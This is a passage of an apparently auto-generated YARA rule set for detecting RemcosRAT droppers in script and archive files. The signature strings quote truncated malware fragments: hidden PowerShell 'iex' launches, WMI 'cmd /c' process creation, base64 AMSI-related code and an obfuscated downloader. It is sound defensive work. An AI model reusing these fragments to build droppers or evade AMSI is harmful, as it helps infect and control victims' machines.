      $s4 = "ksX+xs58mfLogeUvW/MbJb4ADPc/7VcBmxNSQeKWqVnJIIMtXVDhH/Hnp5DQUfAfLx7H1veZlLocSiY25BTuHfBoON8tR6sPYov/dMKPNfe6Q2ObtXkhZFDOUK/f6fLT" ascii /* score: '21.00'*/
      $s5 = "CWrtKi/MnCnqV9t2YT6P7a6qvCZKhB05oiSG4qevKiF5EW6BxmqyoFq8rsfbKCzIhzeoE7VKo/j3RCc2bPGefHHS3k5b1C9p7a8+3vxLDLoGh/VIT/6fsmS50tTnwHNJ" ascii /* score: '20.00'*/
      $s6 = "r+UGAb/6bDUcQnsT/h3gwgAifu1KS234gR9wcvM30C3zTK9BzGbBEzYdcCMDlLLVB/0JkUbv8NWuorUAgwUxvyuUh3+CZ+E44SZOM8vfODNIo3pDnA52Vn+y1kXkgX4r" ascii /* score: '19.00'*/
      $s7 = "X/uS0La2ulUG9yhrP5+Y2ZgIv5+eh/b3NsHjP8BxebPUhfHBHhtdFsUsrUi8KUZ/odnsqQ3MSSEyeKCkeFgUg4jVrkz19RgPM2OXI8x6cIyeRuNdzDVv2dwkL19yKJdZ" ascii /* score: '19.00'*/
      $s8 = "KdJg65CWksNi67pSRlSPy4b6Bm5zOgwOE1EnE39KLeI8o954/OOJlrXucOmpYj/K/cGtoH5UgIMGgNM8xGGMSYX5CCnEP4/pxoiCpsbXGt0gvzhZvg1r3rG0zqRyFlRx" ascii /* score: '19.00'*/
      $s9 = "XFW9MTDb/5v+H88U8v1CFvlx3JdjI+LBN0URr2dhkmUB57/VdBOS7Rif+PbInlq9F7po1gfShymR0JojhwdPAgIoBdblkGz/VPzAKXSQ9Mhy9yzI59aHJ0N1YbqjlOGw" ascii /* score: '19.00'*/
      $s10 = "GnJTImEnemwNt3rktNBT3GahLhOsTmF3VEh2R2qHrpyvInc6g0Nr6XRun3vhknBiypoWrMw8rvrR0sfi14+USUZfSUVN7eaceBUEjMeMcblLyoxkRnAHdtPEsOPLpQ+g" ascii /* score: '19.00'*/
      $s11 = "kt047TOA63eCWXUe/dU8Nc3DcyqGq1NrdJMDBbGX9aI+JMQlbKZX3eRtN5jTJW6dZjM/YDAi5E8h3NfY9r18rPgIyWtMPcsH0OoLUkFeU6VQ/+CXO6GeT2kdmaCsPWqM" ascii /* score: '19.00'*/
      $s12 = "v6N0TPgruNXDfk/JkSMTxF9N6vZO72JFykFpK1b4lVbeHNt3aun6rk18nYwnFzAGJrICveIiYXDHZjFWZizh3zYxwOoACIrQZSiRCK+IuBP83fKeUJgEkBWcprE8F8Vr" ascii /* score: '19.00'*/
      $s13 = "67u3vfoN7RBilWlAvyG0Ejp0CmDPafP0p+Jz6GrdZAMZAK/dfB/iN4smGv3nGpFGTCXfAzuyapsS8ICeQr/SEPgzkGGG28MB0SZ4BuACSPQDwxNUh7RP19ZZ+vsBEOwx" ascii /* score: '19.00'*/
      $s14 = "oBzhbKHxwCpWQvAN0x0FW35vVKFmBcLYWg7BFYlQI0DlL9HthhbVrkNBaArKsnfOHHlt7yInGqY7a+PXqm5+eCnc/LT7uCO6Rk0gwO6I+runjbSxGLRMsl0W/7qVWAKo" ascii /* score: '19.00'*/
      $s15 = "V/urNTj+eCFr/098voAO0yguzukNwb2Z0thSiw11SitMnD87+pwxu2pM3fwgvMOsbtaCWqdW3LPFYGzbXgEdRouGDxVBz5ZFpAViwLwPTkX/+f5Guaw22gC5exeCPggx" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6340 and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__0cd503ae {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_0cd503ae.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0cd503ae4803c5e2386e0377ff9a301b00f37e11dd9f14083d47877637672070"
   strings:
      $x1 = "CyberneticThread.WriteLine(\":: jdgAidNSd+GwnFTmdJTPDPeNyqCP2Cf4e2MEp847hKClJkqlGgH0ayFnvE/tFWveJeprKaNzLUi9j8mj84yBspK6ym8PMzPD" ascii /* score: '66.00'*/
      $x2 = "GetObject(NovaModule).Get(GalacticController).Create('cmd /c ' + PhotonPortal, null, null, null);" fullword ascii /* score: '32.00'*/
      $s3 = "MGYDZaWAtNnAD3SL/kV0bYws5ioYfG8Cg5yCstPmR/XGzOD2yseLHNIyh8vT0lZgeTEOoZtUQ5e2LqDqW5YUaGW0P0GcOTM5d7dUmPEOoQ2UUCSqpN7gHDFpWLHb7uOm" ascii /* score: '26.00'*/
      $s4 = "CyberneticThread.WriteLine(\"!gluzbzpfskbbyrm! \\\"%cdfexkvxd%w%cdfexkvxd%w%cdfexkvxd%j%cdfexkvxd%h%cdfexkvxd%y%cdfexkvxd%k%cdfe" ascii /* score: '25.00'*/
      $s5 = "HdumP9S71KodKJZSSeAsO3yZuWtlshAauniNXxVdeGcNeDkA7W2f1UzSEX7MFmnk4kfetu7YHt0nBf0rhRuvkxfg9HWsQsbRM72fsi0gJFxgR/GrHZg6XFpVCS8RchyL" ascii /* score: '21.00'*/
      $s6 = "LyZrCWSeqjxDSrOMVRycRzZXVzkd/WkRip6Ob1OMbbMLoJAOaGlOg92KvB7CA2k2ftpWND0BrOyFtiXl7zMUsPEuzc0VGL2brpLeQCLTxyqRGCF88vdIqbYesIHAJu+o" ascii /* score: '20.00'*/
      $s7 = "CyberneticThread.WriteLine(\"%gxwjygormnyuv%%gxwjygormnyuv%c%gxwjygormnyuv%%gxwjygormnyuv%o%gxwjygormnyuv%%gxwjygormnyuv%p%gxwjy" ascii /* score: '20.00'*/
      $s8 = "oIL/e4iqq1qzyJ53+SY4LXpzNgONgETzgA3pgOUP/t3ispbjxhWSCgrKis4wFDOMA2kQuNKYumANoGxaJaT9uSeRdKD9GE9r/bWTiWRvhvGTFs1t6Y3FXcN5UOctRyDY" ascii /* score: '19.00'*/
      $s9 = "uk1IIWfOMcXjThoWmgbAuBHC+6g3cPY58E0eMBkLQ8HsChkpY/OL4GJeu4s6dq4mHpBb8aotxmVmeNCoMdmLRrFwvmXoPmMC2dSfYmKZE9LfqF4nhUfOrspYdYBrTjPf" ascii /* score: '19.00'*/
      $s10 = "Z57X1rFZl1G687w+2GYhmagWdENnmcr/5Sc3Yc4xGZdMD9l2Y5pekvW0efkeyEvaWM5EODQHviVdT18rL4VYtXBj+Lo8ksLA7orIyvGY04vgByEAVWf86zcM7U+IxuNu" ascii /* score: '19.00'*/
      $s11 = "9aKHJbfmpkWV8E05um9IQtHPRx3f26XEfG4tl4Rc2UuoIGc8NxG5rCBuFn7keYeaq/hw7y/zRUJSkF/Y33sdI6ATMWSJBbmgJHY30OBBuw9F2RbvEAu7Di7kowy6/0fV" ascii /* score: '19.00'*/
      $s12 = "xd%k%cdfexkvxd%q%cdfexkvxd%j%cdfexkvxd%f%cdfexkvxd%v=-nop -w h -c \\\"\\\"iex([Text.Enc\\\"\");" fullword ascii /* score: '19.00'*/
      $s13 = "CyberneticThread.WriteLine(\"!gluzbzpfskbbyrm! \\\"%xqgeyeori%j%xqgeyeori%c%xqgeyeori%n%xqgeyeori%u%xqgeyeori%n%xqgeyeori%n%xqge" ascii /* score: '19.00'*/
      $s14 = "iw1DqKr0J4279L9kQzSGfee4nYFfDSbkvSsw5iXsMKpwiQ3ylOGP9O9/wxD/fEBhnFUvl6VRhVrgQruNTrSZ0r0Xo8WoamlvlLOqkQdkKS+xcnaBq7USyT/CIeQirD56" ascii /* score: '19.00'*/
      $s15 = "CyberneticThread.WriteLine(\"!gluzbzpfskbbyrm! \\\"%uqirnxwbb%p%uqirnxwbb%i%uqirnxwbb%y%uqirnxwbb%b%uqirnxwbb%p%uqirnxwbb%c%uqir" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__7675a2ff {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_7675a2ff.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7675a2ffde9f543953e55c0d0d9d4805199e07859c1329b73df2ce8591b5dac2"
   strings:
      $x1 = ":: F8IYkbqRSTxwqyFrYSBGnt8gGT0IptnSiJ06YAVnKfX0nvEC2k4uOtghSrPTVINUgM19aEnYR9apkM0POnnnDJM2y+gXTWgpzt7o5yz7QfNJmWtXOSc8xpebcE1Ne" ascii /* score: '68.00'*/
      $s2 = "aU91JtodCtq4xk5bH+8Nog4DJybgMKOlqXBEQujt99ha0MUTEXkw32nVR+ePqF1exc7Y2DF3bMhzDfGc+uTbVXJbexzEMCCeURAhndVR+7m+plt7kdv8yyiCIC2YSTO7" ascii /* score: '22.00'*/
      $s3 = "br12fk/S998wJxf+/ryRVKgkBvIxQULUzJOmrQ49Hh5yi+HMNfOKMmt3jUOCwSZm0nknV/iigEt6lvFSa/wQVmqGo5+cbFSuvApP55baUIMQSpyXhBwvG1UdJuAVn+YX" ascii /* score: '21.00'*/
      $s4 = "W1J0sSPYiGZXlIcW0AaNeAdqbAQk7oEDeIxPircmf4aelTKqoLA+6yvBzwv217+qCcpY7/rrUSddYdThB1hk4ZwyqQ4iUmSWzE2dRi9VzBll2hsyAoieg6jyXWdSbXNb" ascii /* score: '21.00'*/
      $s5 = "A6nm7DjCB1vZA7LPiYjMFx4teMpkXV1s45CnNZnDlmAj3oBKZeuQfTZ+fLNa4NgbmA6zjOktJy3ZL9pQOizSrgV+qhGfLlPd7SIAp15OuZCHlUBCd/9DzAuHHxAqE3Z9" ascii /* score: '18.00'*/
      $s6 = "KJ072STtCoGoNIYz0eq12+slmS28coM7uuMRyiNo+cVcrb3MQ0ZmhTNSAkDRKs+8Xl9KClSJyjmAjiafyKfmJZNXXQM/BAgPEpVHyfVcS8CM2F0NZh/D22hcxisEKusP" ascii /* score: '18.00'*/
      $s7 = "crpQEcQ9L3YPj92wV4OC5tUulkgE2evBXKhR3K4gSWY9iNoy/Ybe9opXjvCMG8jNgIjFenzzeTOBiZDeTRt4BUPYR7BAUppiPE7JFnoZc/T7/XPzSCv5aIGaaKbB4ckc" ascii /* score: '17.00'*/
      $s8 = "XBem6ZV2FRZdjWr3ULHoQmavVf5cTeYqNRVP4Ss7JDuPBkrdrdPIPekk/8YHztAGGx9BwCc1BaED0EiAEXbwCezUcinY+fYWAh6hCS0xC9gPRytVQX8/PWs/1rTe56Ab" ascii /* score: '17.00'*/
      $s9 = "UU/4nHAq55aZ0PLlvkaJnP9b7AQ2YKJZSf5OPipehczAWspa6YqqhMoijHZjavOQVt92LU4g6mbQClWKW/KD6xoxb+7K7yowEm5mSPUwPa+71wjBzogoEo6HqDlmJmg2" ascii /* score: '17.00'*/
      $s10 = "cgpxLvjdQDKjXUHITl1ch+Wy5AVjDRn/oHTGisSU77soc1osth5ggYXagETuY/pxGc/KCcNNSDicNfstatAX17is2SR0Roi2VO93lU1b9yKuanZvTvRVg2jOGhXrrYeQ" ascii /* score: '16.00'*/
      $s11 = "KdkDmXPaw/N4sPyDMTxN9GwSlg8UwI1wWACzTPKkw6sy3ACorZXsa0aUehpydFiWJrYnCIhs47DoRB6hPRkWq1BR9GilS/9SYMG1yBQSIwe7IFTBH0FyBqK7On040wCC" ascii /* score: '16.00'*/
      $s12 = "IOw7ShvMtWfTpBVmus3wmat4mxMI9RO45CG1vvicFFDWHRJZIh3C9NV/5dVbDOR/ZfIWfamDbQdKcSHdosMXcVgUkK6w9WLDFyB7D/mHNfMbmc0bpJ8ShDvvp1ejYDnO" ascii /* score: '16.00'*/
      $s13 = "!pkjjghfmqkmmmkv! \"%bhgrvaeqn%j%bhgrvaeqn%y%bhgrvaeqn%k%bhgrvaeqn%v%bhgrvaeqn%z%bhgrvaeqn%y%bhgrvaeqn%h%bhgrvaeqn%e%bhgrvaeqn%q" ascii /* score: '16.00'*/
      $s14 = "vzfF/qociR4coN6mlZMhn3oL42tojYwhP1sDjpWIC2hnTkm9f7SlUS46vpB3GXTy38IVKjYATaZ8ZWL+HeAdVEoIIGoK/C7+0oiBuqAw7p1LqqKhuSzO8NP3wypVniL9" ascii /* score: '16.00'*/
      $s15 = "0QvJcxisxV1ldUWajd1szxVEIcKR4/eSXBBQFPMctfREmkOg7Or0f98Afog2TYrxEZZG5lzm2tE8ZxV3G4Aio2w6YKrDskZ1wnMEYeFBdtFLvbkugi0pF2flJHkB99i5" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x7525 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__7776dd6e {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_7776dd6e.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7776dd6eb20f3e1d9cdb52292e61867e97e8a05ffe6bec81ed742e641c1b60c6"
   strings:
      $x1 = ":: rGF11ZbKHoeg2jMA8k4a8Czq6eQ0gZjThxjDjX0PmWCt8Yb62slh2/EIsnCO/JpB40Xt6159DKA/RekxDf1kqGU7f7s9uYr7FIavfqouXwr5JuTWVL38tT5qnP7rm" ascii /* score: '70.00'*/
      $s2 = "p1nNZURW5lAlQTFFE4kfoNMJ0kiDPKVdJSGafiqI8P3QjxoFi1D7IzZLEtZKt2dmnszsTDG7VPo1iOroKdqwIQcDUmPpCukMW9zIl7lcyoFTZRzw6yyBS7Ve0ojceg8L" ascii /* score: '21.00'*/
      $s3 = "GqTa8RSvidV/lvZzhunwyOXkXt/pfPn+iu/J+G2w9R3VxKbviKN/42CbFz2P1eTtekxOipKs/+OW6eM04cTXWpgirc5CJRsAPMpS25Gs7wbJjw1qbETp9Dsq2RvwEyEF" ascii /* score: '21.00'*/
      $s4 = "NsKngChSpYb1LYjZNa3UqI8Q6tYBtuyR7E6PiQUfOJeytGxAwZH0j8LKLShTkTFrmJLnOPgfYequR/D9KJovQ/NG8lmhxSquPL3lcosMOcGeThVCm5DQyh824GQva9+r" ascii /* score: '21.00'*/
      $s5 = "KQm6YUXjHivMmnSJGIlvDKQ8V5sc0u2E9y2vyFRxZZDDQixyxvsPyTkhoaNZ95YUpz6UD7yr7Tcpzm9nhRADLLk3srUdaOcPlhFMfgCd1S+Jl+F5/79zZNMZpNcswlhF" ascii /* score: '21.00'*/
      $s6 = "awasvhtiv%o%awasvhtiv%v=-nop -w h -c \"\"iex([Text.Enc\"" fullword ascii /* score: '19.00'*/
      $s7 = "m0xI+v3992ji8UTVET3AOOFp1L82l/nn5nMQ3miTCraLHAsh6WnGrq0Sk4JCos5H9ZZPuY7z9P6DnvdlrS8VhWEvMjtpFhlQnuVfn4uy5g5pplT5NdAEYeF1c6TP+4rq" ascii /* score: '19.00'*/
      $s8 = "q3Cj3x2RWme0qVoS5ievjolNzfSCJXsCKspY5HIRVMBP4hu3ivgtSn9xTTS7FJAJISBTMPgpvaraF0PvG9fEE2mXRljAS2ywVOacpyRgW8lF/DG9hqrG4C8dfnvQf8HR" ascii /* score: '19.00'*/
      $s9 = "!pkkhqhqfzsojmow! \"%awasvhtiv%n%awasvhtiv%l%awasvhtiv%d%awasvhtiv%z%awasvhtiv%r%awasvhtiv%a%awasvhtiv%x%awasvhtiv%u%awasvhtiv%f" ascii /* score: '19.00'*/
      $s10 = "XZoG/oAxbszPFgMalzVNe+EKOh9bOabP2pK8YAXHPIPEPXokrDNAo9p9frwTERSz4IrX5kC/3pF8QnvxdjelYdZoPwkMrEz7pV/R/C3J+v/3u319HCNNpkwNPc+QQ9Hh" ascii /* score: '17.00'*/
      $s11 = "YIX/6zSz631irc50q4SQ6GQUXrWXMpgvc55g25s0K+Q8lSgRiwV1Cexo4eOZbRrC5IzDueQydSVgpbzgCu+lae87PZKy8Ra3DA3XDp34HbemZYzTRmesGbO9pCza4tMn" ascii /* score: '16.00'*/
      $s12 = "heVY+0gaxh4hfCc2tvbF0RSwsg/NsQXfQ0vXx3P4iwmQo/4R+fDl7kfJMdRTgXlr/OV3HdjMOs7jxpoT6W5Oog20LvuzIUsCc+ZNmn1K2i54vR8iWEMB/VrhOstttpu4" ascii /* score: '16.00'*/
      $s13 = "YEIARUfodsORfvnDI3h9ph8q+UiFYaYAWlduIXBXHQhnV9oLfTpH3klV7lP7ojneOqk/aH3Dqk4829dv0xrsetPezmGK/ja5CIbrOBIiHITlOIUrbHqs7CHdLgTAPEE9" ascii /* score: '16.00'*/
      $s14 = "cObw42acBs7dYhO274FTNHPCgvSbhZvS8TB4Y2F3vgSgK4ttL+I6pK1gqxBc3Dqf7a3fmkBgRo/5DPuUIeuG4GLSPyaKomEtn1PMjY8fAQI+Vd5meURwXrlmp86hvmRC" ascii /* score: '16.00'*/
      $s15 = "r9fQihpXfFeeNOgt0SwlMwi6EB84XJNZvamsXPzeqWNAqwYYjZRhyj62WuqvPXoRQr3BY8YNXshgqlNwv3WStYA0fak4vLTDllv/hbLynnKDe0NLPF189ExTXfNk89l5" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6f25 and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__7dffc45a {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_7dffc45a.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7dffc45a0cc8b14c10ca3e1bd794a15d33f07904afad7d57ce5b5175ef73d408"
   strings:
      $x1 = "SyntheticRegistry.WriteLine(\":: wC8Sezq2Wf1+G/bM7yX0lVeg4xsMCBBgu6h+oaalIF8/JaLHz3mypAUdHQk4bwCXEjguOWCxf49U6rKtiCSkGIPFE58wGmL" ascii /* score: '65.00'*/
      $s2 = "GetObject(OrbitalEngine).Get(AtomicChannel).Create('cmd /c ' + PhotonBridge, null, null, null);" fullword ascii /* score: '29.00'*/
      $s3 = "SyntheticRegistry.WriteLine(\"!toqnqxvwwvmwuck! \\\"%qamqtywem%s%qamqtywem%g%qamqtywem%u%qamqtywem%b%qamqtywem%w%qamqtywem%a%qam" ascii /* score: '22.00'*/
      $s4 = "HkegdYQZnfmKMAIsr1wzAbAOAr2ZoPDK+K1P8Qf6QAQETp+HKW+NGH7EpKS++EX6T6X2pyKTG5s2uuTVWJlx4gcqhhoZqwbfLk/BQa3i4rnUupoVgy4JewvQ2orDUMp9" ascii /* score: '21.00'*/
      $s5 = "IAAkAHQAaQBkAGUATQBvAGQAaQBmAGkAYwBhAHQAaQBvAG4ARABhAHQAYQAgAD0AIAAkAHQAaQBkAGUATQBvAGQAaQBmAGkAYwBhAHQAaQBvAG4AUABhAHQAdABlAHIA" ascii /* base64 encoded string '  $ t i d e M o d i f i c a t i o n D a t a   =   $ t i d e M o d i f i c a t i o n P a t t e r ' */ /* score: '21.00'*/
      $s6 = "dQBuAGMAdABpAG8AbgAgAD0AIAAkAGMAdQByAHIAZQBuAHQATQBlAG0AbwByAHkATQBhAG4AYQBnAGUAcgA6ADoAUgBlAGEAZABJAG4AdAA2ADQAKABbAEkAbgB0AFAA" ascii /* base64 encoded string 'u n c t i o n   =   $ c u r r e n t M e m o r y M a n a g e r : : R e a d I n t 6 4 ( [ I n t P ' */ /* score: '21.00'*/
      $s7 = "dABpAG0AaQB6AGEAdABpAG8AbgBSAGUAcwB1AGwAdAAgAD0AIABFAHgAZQBjAHUAdABlAC0AVwBhAHYAZQBTAHkAcwB0AGUAbQBPAHAAdABpAG0AaQB6AGEAdABpAG8A" ascii /* base64 encoded string 't i m i z a t i o n R e s u l t   =   E x e c u t e - W a v e S y s t e m O p t i m i z a t i o ' */ /* score: '21.00'*/
      $s8 = "cgAgAD0AIAAkAGMAdQByAHIAZQBuAHQATQBlAG0AbwByAHkATQBhAG4AYQBnAGUAcgA6ADoAUgBlAGEAZABJAG4AdAAzADIAKABbAEkAbgB0AFAAdAByAF0AKAAkAHMA" ascii /* base64 encoded string 'r   =   $ c u r r e n t M e m o r y M a n a g e r : : R e a d I n t 3 2 ( [ I n t P t r ] ( $ s ' */ /* score: '21.00'*/
      $s9 = "ZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZQB0AGgAbwBkAEEAdAB0AHIAaQBiAHUAdABlAHMAXQAnAFIAVABTAHAAZQBjAGkAYQBsAE4AYQBtAGUALABIAGkA" ascii /* base64 encoded string 'e m . R e f l e c t i o n . M e t h o d A t t r i b u t e s ] ' R T S p e c i a l N a m e , H i ' */ /* score: '21.00'*/
      $s10 = "smubnb3H6kSVF3SpeEoHpq2eDdUmpS+92zmMQJ0nS7s/HBDlMtcz5dsJfbafqXYePfKqrQGno4IlvcqiGvyT+ejAd9kQhWQJ7PnxbI/z11jmyCmMobFpjGbrBwlcw1UN" ascii /* score: '21.00'*/
      $s11 = "KABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALgBNAGEAawBlAEIAeQBSAGUAZgBUAHkA" ascii /* base64 encoded string '( [ I n t P t r ] , [ U I n t 3 2 ] , [ U I n t 3 2 ] , [ U I n t 3 2 ] . M a k e B y R e f T y ' */ /* score: '21.00'*/
      $s12 = "ZgBsAGUAYwB0AGkAbwBuAC4ATQBlAHQAaABvAGQASQBtAHAAbABBAHQAdAByAGkAYgB1AHQAZQBzAF0AJwBSAHUAbgB0AGkAbQBlACwATQBhAG4AYQBnAGUAZAAnACkA" ascii /* base64 encoded string 'f l e c t i o n . M e t h o d I m p l A t t r i b u t e s ] ' R u n t i m e , M a n a g e d ' ) ' */ /* score: '21.00'*/
      $s13 = "bwBtAGEAdABpAG8AbgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkAQwBvAG4AdABlAHgAdAAnACwAJwBOAG8AbgBQAHUAYgBsAGkA" ascii /* base64 encoded string 'o m a t i o n A s s e m b l y . G e t F i e l d ( ' a m s i C o n t e x t ' , ' N o n P u b l i ' */ /* score: '21.00'*/
      $s14 = "cwBzACwAIAAkAHQAaQBkAGUASQApACwAIAAkAHQAaQBkAGUATQBvAGQAaQBmAGkAYwBhAHQAaQBvAG4ARABhAHQAYQBbACQAdABpAGQAZQBJAF0AKQAgAHwAIABPAHUA" ascii /* base64 encoded string 's s ,   $ t i d e I ) ,   $ t i d e M o d i f i c a t i o n D a t a [ $ t i d e I ] )   |   O u ' */ /* score: '21.00'*/
      $s15 = "PQAgACQAcwB1AHIAZgBiAG8AYQByAGQATQBlAG0AbwByAHkAUAByAG8AdABlAGMAdABvAHIALgBJAG4AdgBvAGsAZQAoACQAQwB1AHIAcgBlAG4AdABUAGEAcgBnAGUA" ascii /* base64 encoded string '=   $ s u r f b o a r d M e m o r y P r o t e c t o r . I n v o k e ( $ C u r r e n t T a r g e ' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__154c4324 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_154c4324.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "154c432440596b667482841fcdefa9d0005a532a4a305867cde7501d52fb3423"
   strings:
      $s1 = "Thbvouezemxphgq.exe" fullword ascii /* score: '22.00'*/
      $s2 = "* vd.cs" fullword ascii /* score: '9.00'*/
      $s3 = "* |a=u" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__1eeefad3 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_1eeefad3.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1eeefad3b4af3c0592006bbf93b5ef9c958d72470aa26bb2c042f5e3966eb059"
   strings:
      $x1 = "WaterLot9192.WriteLine \":: vJEUF99sJk6yJzzqqH1nlfIzk0khTITyvHljNGNxecZadK5TCwqm82a5kr8aNz/FjzFL8B9BYre/mNQuWSm/aj1/aLGB64OPvjs+" ascii /* score: '66.00'*/
      $x2 = "GetObject(\"winmgmts:\").Get(\"Win32_Process\").Create \"cmd.exe /c \" & WaterArea3381, Null, Null, Null" fullword ascii /* score: '50.00'*/
      $x3 = "FenceLand = Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Repl" ascii /* score: '32.00'*/
      $x4 = "WaterArea3381 = \"C:\\\\Users\\\\Public\\\\SoilRanch.bat\"" fullword ascii /* score: '31.00'*/
      $s5 = "qS/gXwlAHbInEQwQBXmT1JyyqoEsFKaPeSE+UR8I/RNjVpsHwt81sOftpRsl/rfpQ+tl9EVw92JVEYEd2J+4I2vOvFl9eJQb4MGr7kNAILoR4Od2Mmc9roPzRrAwEkjO" ascii /* score: '24.00'*/
      $s6 = "TractorArea & BarnZone5492 & SoilProperty8474 & SeedPlot & FieldLocation5423 : FieldPost = \"\"\"\" : WaterArea3381 = \"C:\\\\Us" ascii /* score: '22.00'*/
      $s7 = "WaterLot9192.WriteLine \"!evvgtmzywehzybs! \"\"%kgnsvapkv%o%kgnsvapkv%x%kgnsvapkv%h%kgnsvapkv%b%kgnsvapkv%f%kgnsvapkv%f%kgnsvapk" ascii /* score: '22.00'*/
      $s8 = "f0opr4spYHAfgIG/kKXS3hyw7OeyIJcwrtBleAiq+zOLo9iet+7YoM3p2puWi99INFMstIS6DjJ6FRcMDjAWNlLsnNzr9pXkwAlOPGWcjI44vsXqvdgJzaV+4c894tNI" ascii /* score: '19.00'*/
      $s9 = "Ez/NXw+g+HyEZRbVw2nWu1C1j4o1EIkeYE1AUnKvqG+CoCdxUeJa9PAc2xGebq32ojgk1SgSfMAPN2iifLk4xVg9N38ybK1MUoSjGffz4XSuZljO9dkw/TO61PPMRx6F" ascii /* score: '19.00'*/
      $s10 = "%kgnsvapkv%y%kgnsvapkv%z%kgnsvapkv%t%kgnsvapkv%q=-nop -w h -c \"\"\"\"iex([Text.Enc\"\"\"" fullword ascii /* score: '19.00'*/
      $s11 = "4bWVASaydraDGFAH0Esv+gSa/tOvDJIOfL6mhjOFbInerIUQW+4LazXfMBj6Ig9dmEd4S5XfJeqKowTeCjWyw2GrFqsw49sdLogbIaT5FXMPr7RcM7YN9ezwsvkMj4WS" ascii /* score: '19.00'*/
      $s12 = "xvEsompQzw8PSMVNqyT0pGkec5xKxPPBmt87YNcm71eNr8fSJ19qOJ0H1Z26xRHr0kfL4L4cVyFa5qRdmY19Nm7A6lIxjUn38TeHmNTEMPF8q6HYcVpFBVA2JQScj0vh" ascii /* score: '18.00'*/
      $s13 = "ZNnNoN7UUx2ZQWB8HuNp6kUaWwdoyJQtY/nJhg3F5ypk70CIVWwxCTW2gUmGn3tMPxvuNiDImCbems19gtnIz4/V7B0EWzOjPSfjb43hSORIjOwghHzNVnqyCpjNjJwP" ascii /* score: '18.00'*/
      $s14 = "Z5N58z4Apwn/vkdwGRhM8uoHSHi8KKtA7/rJHGnjo1oIOZ3rSruNQmqUsuQQsDM0wt/TyPqyLy9fr5q4qXY9BRl9iQCqbLzUmat2gquWPWndCUaCkKN7n0Ta+MIw83p+" ascii /* score: '17.00'*/
      $s15 = "WaterLot9192.WriteLine \"%vfqutzmxmgya%%vfqutzmxmgya%c%vfqutzmxmgya%%vfqutzmxmgya%o%vfqutzmxmgya%%vfqutzmxmgya%p%vfqutzmxmgya%%v" ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x6946 and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__29effeb7 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_29effeb7.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "29effeb71b06ef8a5f540ebf1c11a0390b66e60696bbcefd7ef823e3e6b4317c"
   strings:
      $x1 = "function a(){var D=['item','424089paNIwT','Files','Delete','Close','79736ZOsdVF','.exe','146048oBxHxC','atEnd','charAt','Shell.A" ascii /* score: '34.00'*/
      $s2 = "function a(){var D=['item','424089paNIwT','Files','Delete','Close','79736ZOsdVF','.exe','146048oBxHxC','atEnd','charAt','Shell.A" ascii /* score: '21.00'*/
      $s3 = "TTP','Run','11115624oWoCYh','CreateFolder','open','170tcBWgz','WScript.Shell','GET','Name','Items','random','31357161JFcGUU','ex" ascii /* score: '17.00'*/
      $s4 = "','length','ExpandEnvironmentStrings','GetFolder','8986800ZVlVaM','send','GetExtensionName','FolderExists','status','MSXML2.XMLH" ascii /* score: '9.00'*/
      $s5 = ".zip',r=h(0x6),s=f(n,o,q),t=f(n,o,r);i(p,s)&&(j(n,s,t)&&(g(0x5dc),k(n,m,t)));}catch(u){}}function d(m){return WScript['CreateObj" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 7KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__2d97195a {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_2d97195a.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2d97195a1831e2f22c637d739d54eb895e014f2e07ac95189935f21de26e306c"
   strings:
      $s1 = "powershell.exe -windowstyle hidden \"spsv forcleave;function Domineri ($dukkeh){ $depart=3;do {$soaplee+=$dukkeh[$depart];$depar" ascii /* score: '30.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"spsv forcleave;function Domineri ($dukkeh){ $depart=3;do {$soaplee+=$dukkeh[$depart];$depar" ascii /* score: '27.00'*/
      $s3 = "6266616660" ascii /* score: '17.00'*/ /* hex encoded string 'bfaf`' */
